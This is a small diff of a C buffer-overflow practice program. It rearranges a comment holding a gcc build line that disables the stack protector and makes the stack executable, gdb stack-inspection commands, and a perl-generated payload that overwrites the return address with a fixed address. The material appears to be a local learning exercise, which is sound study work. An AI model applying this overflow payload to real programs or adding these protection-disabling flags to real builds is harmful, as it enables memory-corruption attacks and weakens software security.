@@ -21,8 +21,14 @@ int main(int argc, char* argv[]){
     printf("\nExecuted Normally !\n");
     return 0;
 }
-/*
+/*		
+	>	gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c
+
+	>	x/16xw $rsp
+
+	>	x/16xw $rbp
+
  (gdb)	run $(perl -e 'print "A"x13 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
- 	>	gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c
- 	>	x/16xw $rsp
+ 	
 */
+
